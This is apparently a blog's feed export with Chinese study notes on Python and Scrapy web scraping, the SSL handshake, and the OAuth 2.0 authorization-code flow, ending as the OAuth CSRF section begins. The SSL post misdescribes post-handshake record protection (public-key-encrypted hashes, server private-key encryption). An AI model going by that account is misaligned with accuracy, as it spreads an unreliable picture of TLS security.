class="number">0x103d10828</span>&gt; <span class="comment">#输出惰性序列</span></span><br><span class="line">&#123;<span class="number">1</span>: <span class="string">'apple'</span>, <span class="number">2</span>: <span class="string">'banana'</span>, <span class="number">3</span>: <span class="string">'grapes'</span>, <span class="number">4</span>: <span class="string">'pear'</span>&#125;</span><br><span class="line">[(<span class="number">1</span>, <span class="string">'apple'</span>), (<span class="number">2</span>, <span class="string">'banana'</span>), (<span class="number">3</span>, <span class="string">'grapes'</span>), (<span class="number">4</span>, <span class="string">'pear'</span>)]</span><br><span class="line">((<span class="number">1</span>, <span class="string">'apple'</span>), (<span class="number">2</span>, <span class="string">'banana'</span>), (<span class="number">3</span>, <span class="string">'grapes'</span>), (<span class="number">4</span>, <span class="string">'pear'</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;跟着“菜鸟学Python”这个我最喜欢的公众号文章做点练习和巩固基本套路&lt;/p&gt;
&lt;h1 id=&quot;0
      
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Scrapy使用简介_2</title>
    <link href="http://yoursite.com/2018/03/02/Scrapy%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B-2/"/>
    <id>http://yoursite.com/2018/03/02/Scrapy使用简介-2/</id>
    <published>2018-03-02T10:22:12.000Z</published>
    <updated>2018-03-02T06:03:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>继续介绍Scrapy的其他用法，丰富一下各种姿势</p><h1 id="0x01-Scrapy里面的request对象"><a href="#0x01-Scrapy里面的request对象" class="headerlink" title="0x01 Scrapy里面的request对象"></a>0x01 Scrapy里面的request对象</h1><p>request对象是在Scrapy编写中经常要用到的，你要发送一个请求给调度器爬娶，就必须构造request对象，这个对象里面有各种属性可以使用，例如设置request的header，cookie等，下面是request基础参数：</p><ul><li><p>url —— 请求的url</p></li><li><p>callback —— 请求回来的reseponse处理函数，也叫回调函数</p></li><li><p>headers —— 页面的headers数据</p></li><li><p>cookies —— 设置页面的cookies，下面是一些小例子。<strong>这里没有设置callback，Scrapy会默认调用parse()函数作为callback函数传入</strong></p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#传入多个键值对：列表</span></span><br><span class="line">request_with_cookies = Request(url=<span class="string">"http://www.example.com"</span>,</span><br><span class="line">                               cookies=[&#123;<span class="string">'name'</span>: <span class="string">'currency'</span>,</span><br><span class="line">                                        <span class="string">'value'</span>: <span class="string">'USD'</span>,</span><br><span class="line">                                        <span class="string">'domain'</span>: <span class="string">'example.com'</span>,</span><br><span class="line">                                        <span class="string">'path'</span>: <span class="string">'/currency'</span>&#125;])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#传入单一键值对：字典</span></span><br><span class="line">request_with_cookies = Request(url=<span class="string">"http://www.example.com"</span>,</span><br><span class="line">                               cookies=&#123;<span class="string">'currency'</span>: <span class="string">'USD'</span>, <span class="string">'country'</span>: <span class="string">'UY'</span>&#125;)</span><br></pre></td></tr></table></figure><ul><li>meta —— 最神奇的参数，它是一个字典，可以用来做页面间传值，但同时又一大堆重要的健值，适当设置可以精细化你的request，先看看如何传值</li></ul><p>我对前面的猫眼做了一点改写，把保存了数据的item对象传了meta字典保存：meta = {“key” : item} ，然后通过这个新的Request对象调用的新的url，传到新的callback：parse2 ，然后取出meta里面的数据交给pipeline处理，这样我就实现了数据在页面间传递了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line"></span><br><span class="line">    nodelist = response.xpath(<span class="string">"//div[@class='board-item-main']"</span>)</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> nodelist:</span><br><span class="line">        item = MaoyanItem()</span><br><span class="line">        item[<span class="string">'name'</span>] = node.xpath(<span class="string">".//a/text()"</span>).extract()[<span class="number">0</span>]</span><br><span class="line">        item[<span class="string">'actors'</span>] = node.xpath(<span class="string">".//p[@class='star']/text()"</span>).extract()[<span class="number">0</span>].split()</span><br><span class="line">        integer = node.xpath(<span class="string">".//i[@class='integer']/text()"</span>).extract()[<span class="number">0</span>]</span><br><span class="line">        fraction = node.xpath(<span class="string">".//i[@class='fraction']/text()"</span>).extract()[<span class="number">0</span>]</span><br><span class="line">        item[<span class="string">'score'</span>] = integer+fraction</span><br><span class="line">        <span class="keyword">if</span> self.offset &lt; <span class="number">10</span>:</span><br><span class="line">            self.offset += <span class="number">10</span></span><br><span class="line">            url = self.base_url + str(self.offset)</span><br><span class="line">            <span class="comment"># url = response.urljoin(str(self.offset))</span></span><br><span class="line">        <span class="comment">#yield response.follow(str(self.offset),callback = self.parse2 ,meta = &#123;"key" : item&#125;,dont_filter = True)</span></span><br><span class="line">        <span class="keyword">yield</span> scrapy.Request(url, callback = self.parse2 ,meta = &#123;<span class="string">"key"</span> : item&#125;,dont_filter = <span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse2</span><span class="params">(self,response)</span>:</span></span><br><span class="line"></span><br><span class="line">    item = response.meta[<span class="string">"key"</span>]</span><br><span class="line">    <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>官方解释meta：</p><blockquote><p>A dict that contains arbitrary metadata for this request. This dict is empty for new Requests, and is usually populated by different Scrapy components (extensions, middlewares, etc). So the data contained in this dict depends on the extensions you have enabled.</p><p>See Request.meta special keys for a list of special meta keys recognized by Scrapy.</p><p>This dict is shallow copied when the request is cloned using the copy() or replace() methods, and can also be accessed, in your spider, from the response.meta attribute.</p></blockquote><p>其他详细的meta特殊字典健值可以参考下面的官方链接：</p><p><a href="https://doc.scrapy.org/en/latest/topics/request-response.html#topics-request-meta" target="_blank" rel="noopener">https://doc.scrapy.org/en/latest/topics/request-response.html#topics-request-meta</a></p><h1 id="0x02-Request对象的源码解读"><a href="#0x02-Request对象的源码解读" class="headerlink" title="0x02 Request对象的源码解读"></a>0x02 Request对象的源码解读</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span><span class="params">(object_ref)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url, callback=None, method=<span class="string">'GET'</span>, headers=None, body=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 cookies=None, meta=None, encoding=<span class="string">'utf-8'</span>, priority=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 dont_filter=False, errback=None, flags=None)</span>:</span></span><br><span class="line"></span><br><span class="line">        self._encoding = encoding  <span class="comment"># this one has to be set first</span></span><br><span class="line">        self.method = str(method).upper()</span><br><span class="line">        self._set_url(url)</span><br><span class="line">        self._set_body(body)</span><br><span class="line">        <span class="keyword">assert</span> isinstance(priority, int), <span class="string">"Request priority not an integer: %r"</span> % priority</span><br><span class="line">        self.priority = priority</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> callback <span class="keyword">or</span> <span class="keyword">not</span> errback, <span class="string">"Cannot use errback without a callback"</span></span><br><span class="line">        self.callback = callback</span><br><span class="line">        self.errback = errback</span><br><span class="line"></span><br><span class="line">        self.cookies = cookies <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">        self.headers = Headers(headers <span class="keyword">or</span> &#123;&#125;, encoding=encoding)</span><br><span class="line">        self.dont_filter = dont_filter</span><br><span class="line"></span><br><span class="line">        self._meta = dict(meta) <span class="keyword">if</span> meta <span class="keyword">else</span> <span class="keyword">None</span></span><br><span class="line">        self.flags = [] <span class="keyword">if</span> flags <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">else</span> list(flags)</span><br></pre></td></tr></table></figure><p>看到很多对应的东西，例如meta的初始化处理，cookies和headers接受的格式等，建议仔细阅读</p><h1 id="0x03-Scrapy里面的response对象"><a href="#0x03-Scrapy里面的response对象" class="headerlink" title="0x03 Scrapy里面的response对象"></a>0x03 Scrapy里面的response对象</h1><ul><li>基础参数</li></ul><p>url——请求的url<br>body——请求回来的html<br>meta——用来在“页面”之间传递数据<br>headers——页面的headers数据<br>cookies——设置页面的cookies<br>Request——发出这个response的request对象</p><p>基本和Request对象一一对应，主要介绍一下两个新的方法，</p><p>urljoin()：将页面相对路径改为绝对路径 </p><p><strong>follow()：对相对路径进行自动补全，构造出绝对路径，可以说是URLjoin的升级版，因为这个方法直接返回Request对象</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> self.offset &lt; <span class="number">10</span>:</span><br><span class="line">    self.offset += <span class="number">10</span></span><br><span class="line">    url = response.urljoin(str(self.offset)) <span class="comment">#利用urljoin()构造绝对路径，再传入Request</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">yield</span> scrapy.Request(url, callback = self.parse2 ,meta = &#123;<span class="string">"key"</span> : item&#125;,dont_filter = <span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#直接利用response的follow()方法构造Request</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">yield</span> response.follow(str(self.offset),callback = self.parse2 ,meta = &#123;<span class="string">"key"</span> : item&#125;,dont_filter = <span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>refer：</p><p><a href="https://doc.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Response" target="_blank" rel="noopener">https://doc.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Response</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;继续介绍Scrapy的其他用法，丰富一下各种姿势&lt;/p&gt;
&lt;h1 id=&quot;0x01-Scrapy里面
      
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>SSL握手过程</title>
    <link href="http://yoursite.com/2018/03/01/SSL%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/03/01/SSL握手过程/</id>
    <published>2018-03-01T15:22:25.000Z</published>
    <updated>2018-03-01T07:26:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下SSL的握手过程，里面涉及到了很多基础概念，例如密码学，证书，PKI等</p><p>详细叙述：</p><p>1、浏览器将自己支持的加密规则(也就是 CipherSuite )发给服务器</p><p>2、服务器端收到请求，然后从客户支持的 CipherSuite 中选出一个应答,并发送给客户端公钥证书和选用的 HASH 算法</p><p>3、客户端收到公钥之后,利用自己的信任的根证书对收到的公钥进行验证.若通过,客户端随机生成对称密钥 (Pre-Master secret),然后使用公钥对对称密钥进行加密,并计算连接中全部报文信息的 hash ,再利用生成的对称密钥对 hash 值加密,然后把公钥加密的对称密钥及对称密钥加密的 hash 值发送给服务器.</p><p>4、服务器利用自己的私钥对利用公钥加密的对称密钥进行解密,得到对称密钥. 再利用对称密钥解密 hash 值,对 hash 值进行验证.在验证成功后，会返回给客户端 Finish 报文。（至此，ssl 连接建立成功）</p><p>5、ssl 连接建立完成之后信息的传输加密过程是这样的:</p><p>客户端:先用对称密钥加密要传输的信息,再利用 hash 算法得出加了密的信息的 hash 值.再利用公钥对 hash 值进行加密,之后把对称密钥加密了的信息和利用公钥加密后信息的 hash 值,传输给服务器. </p><p>服务器: 与客户端基本相同，不过把公钥加密换做私钥加密。</p><p>refer:</p><p><a href="http://mp.weixin.qq.com/s/W620Pdu6qvoqjacSRPRVyg" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/W620Pdu6qvoqjacSRPRVyg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下SSL的握手过程，里面涉及到了很多基础概念，例如密码学，证书，PKI等&lt;/p&gt;
&lt;p&gt;详细叙述：&lt;/p&gt;
&lt;p&gt;1、浏览器将自己支持的加密规则(也就是 CipherSuite )发给服务器&lt;/p&gt;
&lt;p&gt;2、服务器端收到请求，然后从客户支持的 CipherSuite
      
    
    </summary>
    
    
      <category term="Web security" scheme="http://yoursite.com/tags/Web-security/"/>
    
  </entry>
  
  <entry>
    <title>Scrapy使用简介_1</title>
    <link href="http://yoursite.com/2018/02/28/Scrapy%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B-1/"/>
    <id>http://yoursite.com/2018/02/28/Scrapy使用简介-1/</id>
    <published>2018-02-27T17:22:12.000Z</published>
    <updated>2018-03-02T02:54:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>上一篇笔记记录了学习Python爬虫的简单思路，然后就要对Python爬虫框架进行基本使用了，玩玩更健康</p><h1 id="0x01-Scrapy基本介绍"><a href="#0x01-Scrapy基本介绍" class="headerlink" title="0x01 Scrapy基本介绍"></a>0x01 Scrapy基本介绍</h1><ul><li>基本数据流图解：</li></ul><p><img src="/images/scrapyworkflow.png" alt="数据流图"></p><ul><li>基本数据流程：</li></ul><ol><li>Spiders发送第一个URL给引擎</li><li>引擎从Spider中获取到第一个要爬取的URL后，在调度器(Scheduler)以Request调度</li><li>调度器把需要爬取的request返回给引擎</li><li>引擎将request通过下载中间件发给下载器(Downloader)去互联网下载数据</li><li>一旦数据下载完毕，下载器获取由互联网服务器发回来的Response，并将其通过下载中间件发送给引擎</li><li>引擎从下载器中接收到Response并通过Spider中间件发送给Spider处理</li><li>Spider处理Response并从中返回匹配到的Item及(跟进的)新的Request给引擎</li><li>引擎将(Spider返回的)爬取到的Item给Item Pipeline做数据处理或者入库保存，将(Spider返回的)Request给调度器入队列</li><li>(从第三步)重复直到调度器中没有更多的request</li></ol><ul><li>简单的说：</li></ul><p>引擎是大脑，负责在各组件中调度传递信息。我们要编写的几个主要组件就是spider，pipeline和中间件</p><ul><li>项目结构：</li></ul><p><img src="/images/structure.png" alt="项目结构图"></p><ul><li>编程思路：</li></ul><p>还是以猫眼这个简单例子，这次使用了scrapy来实现，首先编写maoyan_top.py,实现爬虫主程序，也就是定义一个爬虫，然后编写items.py定义一个存储数据的数据结构，类似dict，最后编写pipelines.py实现数据存储，这就是最简单的scrapy实现思路</p><ul><li>首先编写maoyan_top.py，主要就是编写MaoyanTopSpider类，这个类继承scrapy.Spider，定义好基本URL的数据后，就是主力编写parse函数，这个函数就是负责解析数据的。注意这里我yield了item给pipelines.py处理，yield了scrapy.Request给调度器进行翻页爬取</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> MaoyanItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaoyanTopSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">'maoyan_top'</span></span><br><span class="line">    allowed_domains = [<span class="string">'maoyan.com'</span>]</span><br><span class="line">    base_url = <span class="string">"https://maoyan.com/board/4?offset="</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    start_urls = [base_url + str(offset)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line"></span><br><span class="line">        nodelist = response.xpath(<span class="string">"//div[@class='board-item-main']"</span>)</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> nodelist:</span><br><span class="line">            item = MaoyanItem()</span><br><span class="line">            item[<span class="string">'name'</span>] = node.xpath(<span class="string">".//a/text()"</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">'actors'</span>] = node.xpath(<span class="string">".//p[@class='star']/text()"</span>).extract()[<span class="number">0</span>].split()</span><br><span class="line">            integer = node.xpath(<span class="string">".//i[@class='integer']/text()"</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            fraction = node.xpath(<span class="string">".//i[@class='fraction']/text()"</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">'score'</span>] = integer+fraction</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.offset &lt; <span class="number">100</span>:</span><br><span class="line">            self.offset += <span class="number">10</span></span><br><span class="line">            url = self.base_url+str(self.offset)</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url,callback = self.parse)</span><br></pre></td></tr></table></figure><ul><li>然后编写items.py定义一个存储数据的数据结构给上面的parse函数使用,非常简单我就定义了三个字段，分别为电影的名字，评分和演员</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaoyanItem</span><span class="params">(scrapy.Item)</span>:</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    name = scrapy.Field()</span><br><span class="line">    actors = scrapy.Field()</span><br><span class="line">    score = scrapy.Field()</span><br></pre></td></tr></table></figure><ul><li>最后编写pipelines.py进行存储数据，这里要注意parse函数yield出来的item会到达这里处理</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaoyanPipeline</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span><span class="params">(self,spider)</span>:</span></span><br><span class="line">        print(type(spider))</span><br><span class="line">        print(<span class="string">"open file"</span>)</span><br><span class="line"></span><br><span class="line">        self.f = open(<span class="string">'/Users/Rick7/Desktop/items.json'</span>, <span class="string">'w+'</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line"></span><br><span class="line">        line = json.dumps(dict(item),ensure_ascii=<span class="keyword">False</span>) + <span class="string">"\n"</span></span><br><span class="line">        self.f.write(line)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span><span class="params">(self,spider)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.f.close()</span><br><span class="line">        print(<span class="string">"close file"</span>)</span><br></pre></td></tr></table></figure><ul><li>配置好setting文件激活管道，程序完成</li></ul><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><ul><li>要学scrapy首先要搞清楚这个框架的数据流</li><li>建议阅读官方文档了解其中的类和方法</li><li>后面还会继续学习高级一点点的知识，例如url去重，中间件的使用等</li></ul><p>refer：</p><p><a href="https://doc.scrapy.org/en/latest/index.html" target="_blank" rel="noopener">https://doc.scrapy.org/en/latest/index.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;上一篇笔记记录了学习Python爬虫的简单思路，然后就要对Python爬虫框架进行基本使用了，玩玩更
      
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python爬虫小总结</title>
    <link href="http://yoursite.com/2018/02/28/Python%E7%88%AC%E8%99%AB%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2018/02/28/Python爬虫小总结/</id>
    <published>2018-02-27T16:54:37.000Z</published>
    <updated>2018-02-28T03:44:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近玩了一下Python的爬虫，感觉这个东西对Python初学者还是挺友好的，适合入门Python</p><h1 id="0x01-简单编程套路"><a href="#0x01-简单编程套路" class="headerlink" title="0x01 简单编程套路"></a>0x01 简单编程套路</h1><ul><li>requests 库发送请求</li><li>Beautifulsoap,Xpath,Pyquiry,正则，等解释库提取数据</li><li>储存数据到文件或者数据库</li></ul><p>下面通过一个简单的对猫眼榜单的爬取代码体现上面的思路：</p><ul><li>get_onepage(url)函数发送请求，主要使用requests库</li><li>parse_onepage(content)函数负责解释和提取数据，主要使用了Beautifulsoap</li><li>save_csv(content)函数就是把数据保存到CSV文件</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_onepage</span><span class="params">(url)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '</span></span><br><span class="line">                             <span class="string">'Chrome/60.0.3112.113 Safari/537.36'</span>&#125;</span><br><span class="line">    raw_content = requests.get(url,headers=headers)</span><br><span class="line">    raw_content.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="comment"># print(raw_content.text)</span></span><br><span class="line">    <span class="keyword">return</span> raw_content.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_onepage</span><span class="params">(content)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(content,<span class="string">'lxml'</span>)</span><br><span class="line">    movie_item = soup.find_all(<span class="string">'dd'</span>)</span><br><span class="line">    <span class="keyword">for</span> items <span class="keyword">in</span> movie_item:</span><br><span class="line">        dict = &#123;<span class="string">'index'</span>: <span class="string">''</span>, <span class="string">'title'</span>: <span class="string">''</span>, <span class="string">'star'</span>: <span class="string">''</span>&#125;</span><br><span class="line">        movie_index = items.find(<span class="string">'i'</span>,class_ = <span class="string">"board-index"</span>)</span><br><span class="line">        dict[<span class="string">'index'</span>] = movie_index.get_text()</span><br><span class="line">        movie_title = items.find(<span class="string">'p'</span>,attrs = &#123;<span class="string">'class'</span>: <span class="string">'name'</span>&#125;)</span><br><span class="line">        dict[<span class="string">'title'</span>] = movie_title.find(<span class="string">'a'</span>).get_text()</span><br><span class="line">        movie_actor = items.find(<span class="string">'p'</span>,attrs = &#123;<span class="string">'class'</span>: <span class="string">'star'</span>&#125;)</span><br><span class="line">        dict[<span class="string">'star'</span>] = movie_actor.get_text().strip()</span><br><span class="line">        <span class="keyword">yield</span> dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_csv</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/Users/Rick7/Desktop/data.csv"</span>,<span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">        fieldnames = [<span class="string">'index'</span>, <span class="string">'title'</span>, <span class="string">'star'</span>]</span><br><span class="line">        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)</span><br><span class="line">        writer.writeheader()</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> parse_onepage(content):</span><br><span class="line">            writer.writerow(item)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(offset_number)</span>:</span></span><br><span class="line">    url = <span class="string">"http://maoyan.com/board/4?offset="</span>+str(offset_number)</span><br><span class="line">    html = get_onepage(url)</span><br><span class="line">    save_csv(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        i=i*<span class="number">10</span></span><br><span class="line">        main(i)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><ul><li>这是最简单的爬虫小程序，从中要体会里面思路</li><li>上面的小程序只针对静态页面，对于动态的Ajax加载，使用过selenium，不过感觉十分慢和不友好，建议抓包找去真实的URL比较实际</li><li>比起beautifulsoap，感觉xpath提取数据更加高效简洁</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近玩了一下Python的爬虫，感觉这个东西对Python初学者还是挺友好的，适合入门Python&lt;
      
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>OAuth 2.0 学习笔记 </title>
    <link href="http://yoursite.com/2018/02/13/OAuth-2-0-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2018/02/13/OAuth-2-0-学习笔记/</id>
    <published>2018-02-13T15:47:52.000Z</published>
    <updated>2018-02-28T03:45:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近OAuth又出了一个漏洞，根据漏洞介绍这个漏洞不在OAuth协议，而在用户的部署上，等详细分析吧，漏洞链接如下，借此机会复习一下OAuth2.0</p><p><a href="http://www.cnvd.org.cn/flaw/show/CNVD-2018-01622" target="_blank" rel="noopener">http://www.cnvd.org.cn/flaw/show/CNVD-2018-01622</a></p><h1 id="0x01-OAuth-2-0-流程"><a href="#0x01-OAuth-2-0-流程" class="headerlink" title="0x01 OAuth 2.0 流程"></a>0x01 OAuth 2.0 流程</h1><p>详细的交换就不写了，网上一大堆，简单总结两句授权码模式（authorization code），包括了(用户A，网站B，GitHub(信息提供者,resource owner))</p><p>前提：网站B要想得到GitHub认证，必须先和GitHub协商可以取得什么权限等事情，这时候GitHub认可了网站B的合法性并同意网站B可以使用GitHub的相关用户资料，并给了网站B：Client Id 和 Client Secret。</p><ol><li><p>用户A想登陆网站B，但不想注册，所以点击了下面的GitHub图标，想通过GitHub账号登陆网站B,这时候就触发了OAuth认证</p></li><li><p>网站带着GitHub颁发的Client Id 到 ”<a href="https://github.com/login/oauth/authorize“" target="_blank" rel="noopener">https://github.com/login/oauth/authorize“</a> 请求权限，这时候会显示网站B从GitHub会取得什么权限，如果用户觉得ok就点击授权，不ok就拒绝，认证结束</p></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1</span><br><span class="line">Host: github.com</span><br></pre></td></tr></table></figure><ol><li>当如何点击授权后，页面会跳转到网站B预先设定的 redirect_uri 并附带一个授权码(code)</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Location: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA</span><br></pre></td></tr></table></figure><ol><li>用户A的浏览器得到一个302的回复，然后重定向到网站B指定redirect_uri，网站B从而得到了code，然后网站B拿着 code 和能够标识个人身份的 “client_id “,client_secret“ 去拜访 github，拿到access_token，这里的“client_id “,client_secret“ 是Github判断这个请求的合法性依据，”,client_secret“这个是网站B独有的。</li></ol><figure class="highlight"><table><tr><td class="code"><pre><span class="line">POST //github.com/login/oauth/access_token</span><br><span class="line">params = &#123;</span><br><span class="line">  code: "xxx",</span><br><span class="line">  client_id: "xxx",</span><br><span class="line">  client_secret: "xxx",</span><br><span class="line">  redirect_uri: "http://my-website.com"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = &#123;</span><br><span class="line">  access_token: "e72e16c7e42f292c6912e7710c838347ae178b4a"</span><br><span class="line">  scope: "user,gist"</span><br><span class="line">  token_type: "bearer",</span><br><span class="line">  refresh_token: "xxxx"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>从上面的response中得到了access_token，相应的scope，网站B可以凭借这个token来取得用户在GitHub的信息，至于能够取得的信息范围就由scope来定义了，用户A可以使用GitHub的账号登陆网站B了。这就是授权码模式的简单描述。</li></ol><h1 id="0x02-已知的安全问题-CSRF"><a href="#0x02-已知的安全问题-CSRF" class="headerlink" title="0x02 已知的安全问题-CSRF"></a>0x02 已知的安全问题-CSRF</h1><ol><li>漏洞原理</li></ol><blockquote><p>这个问题的关键点在于，OAuth2的认证流程是分为好几步来完成的，在图1中的第4步，第三方应用在收到一个GET请求时，除了能知道当前用户的cookie，以及URL中的Authorization Code之外，难以分辨出这个请求到底是用户本人的意愿，还是攻击者利用用户的身份伪造出来的请求。 